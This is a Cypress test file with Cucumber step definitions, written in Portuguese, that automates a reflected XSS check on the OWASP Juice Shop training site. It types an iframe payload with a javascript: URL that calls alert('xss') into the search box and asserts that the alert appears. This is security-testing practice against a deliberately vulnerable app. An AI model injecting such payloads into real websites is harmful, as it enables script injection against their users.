/// <reference types="cypress" />
import { Given, And, Then } from "cypress-cucumber-preprocessor/steps"

Given("que acessa a pagina home", () =>{
    cy.visit('https://juice-shop.herokuapp.com/')
})

And("que eu aperta Dismiss", () =>{
    cy.contains('button', "Dismiss").click()
})

And("no campo de busca eu coloque o codigo malicioso", () =>{
    cy.get('.mat-search_icon-search').click()
    cy.get('#mat-input-0').type('<iframe src="javascript:alert(`xss`)">')
})

Then("aperta Enter", () =>{
    cy.get('#mat-input-0').type('{enter}');
})

Then("deve aparecer a mensagem confirmando o xss", () =>{
    cy.on('window:alert', (text) => {
        expect(text).to.contains('xss');
    })
})